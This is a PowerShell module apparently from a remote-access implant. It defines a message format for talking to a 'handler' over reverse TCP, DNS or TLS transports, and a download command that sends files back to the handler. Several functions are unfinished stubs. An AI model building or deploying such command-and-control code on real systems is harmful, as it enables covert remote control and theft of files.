$MESSAGE_HEADER_LEN = 7

$MESSAGE_CHANNEL_COMMAND = 0

$MESSAGE_TYPE_COMMAND = 0
$MESSAGE_TYPE_MESSAGE = 1
$MESSAGE_TYPE_ERRORMESSAGE = 2
$MESSAGE_TYPE_DOWNLOADCOMMAND = 10

function Message-Create {
    <#
        .SYNOPSIS
        create a new message from these fields
        .PARAMETER MType
        type field of the message
        .PARAMETER Content
        content
    #>
    param(
        [Parameter(Mandatory=$true)]
        [Byte]
        $MType,

        [Parameter(Mandatory=$true)]
        [UInt16]
        $ChannelNumber,

        [Parameter(Mandatory=$true)]
        [String]
        $Content
    )

	$len1 = $Content | Measure-Object -Character;
	$len2 = $len1.Characters
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'channelnumber' = $ChannelNumber
       'leng' = $len2
       'content' = $Content
    }
}

function Message-SendToTransport([PSObject] $msg, [PSObject] $transport) {
	$len = [System.Net.IPAddress]::HostToNetworkOrder([Int32]$msg.leng)
	$data = New-Object byte[]($msg.leng+$MESSAGE_HEADER_LEN)
	$data[0] = [byte] $msg.mtype
	$channelnumber = [BitConverter]::GetBytes([UInt16] $msg.channelnumber)
	for ($i=0; $i -lt $channelnumber.Length; ++$i) {
	    $data[1+$i] = $channelnumber[$i]
	}
	$lendata = [BitConverter]::GetBytes([UInt32] $len)
	for ($i=0; $i -lt $lendata.Length; ++$i) {
	    $data[3+$i] = $lendata[$i]
	}
	$textdata = [System.Text.Encoding]::UTF8.GetBytes($msg.content)
	for ($i=0; $i -lt $textdata.Length; ++$i) {
	    $data[$MESSAGE_HEADER_LEN+$i] = $textdata[$i]
	}

    Send-ToTransport $transport $data
}

function Message-ParseFromTransport([PSObject] $transport) {
    $buf = Receive-FromTransport $transport $MESSAGE_HEADER_LEN
    
	$MType = [Byte] $buf[0]
	$ChannelNumber = [Int16][BitConverter]::ToInt16($buf, 1)
	$ChannelNumber = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$ChannelNumber)
	$leng = [Int32][BitConverter]::ToInt32($buf, 3)
	$leng = [System.Net.IPAddress]::NetworkToHostOrder([Int32]$leng)

    $Content = Receive-FromTransport $transport $leng
    $Content = [System.Text.Encoding]::UTF8.GetString($Content)
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'channelnumber' = $ChannelNumber
       'leng' = $leng
       'content' = $Content
    }
}

function Message-Handle([PSObject] $transport, [PSObject] $msg) {
    if ($msg.channelnumber -eq $MESSAGE_CHANNEL_COMMAND) {
        if ($msg.mtype -eq $MESSAGE_TYPE_COMMAND) {
            # TODO: handle command
            return $false
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_MESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Write-Host '[+] HANDLER:' $text
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_ERRORMESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Write-Host '[-] ERROR: HANDLER:' $text
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_DOWNLOADCOMMAND) {
            $downloadchannelid = [Int16][BitConverter]::ToInt16($msg.content, 0)
	        $downloadchannelid = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$downloadchannelid)
            $filename = New-Object String($msg.content, 2, $msg.leng)
            Command-SendFile $downloadchannelid $filename $transport
        } else {
            # TODO: implement other types
            Write-Host 'ERROR: message with invalid type received:' $msg.mtype
            return $false
        }
    } else {
        # TODO: implement other channels
        Write-Host 'ERROR: message for invalid channel received:' $msg.channelnumber
        return $false
    }
}


function Send-ToTransport([PSObject] $transport, [byte[]] $data) {
    if ($CHANNELENCRYPTION -eq "NONE") {
        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
            $buf = Transport-ReverseTcp-Send $transport $data
        } elseif ($CONNECTIONMETHOD -eq "DNS") {
            $buf = Transport-Dns-Send $transport $data
        }
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $buf = Transport-Tls-Send $transport $data
    }
}

function Receive-FromTransport([PSObject] $transport, [Int32] $leng) {
    if ($CHANNELENCRYPTION -eq "NONE") {
        if ($CONNECTIONMETHOD -eq "REVERSETCP") {
            $buf = Transport-ReverseTcp-Receive $transport $leng
        } elseif ($CONNECTIONMETHOD -eq "DNS") {
            $buf = Transport-Dns-Receive $transport $leng
        }
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $buf = Transport-Tls-Receive $transport $leng
    }
    return $buf
}

function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSObject] $transport) {
    Write-Host '[+] sending file to handler:' $filename
    Write-Host '[+] opening channel:' $downloadchannelid
    # TODO: to implement
}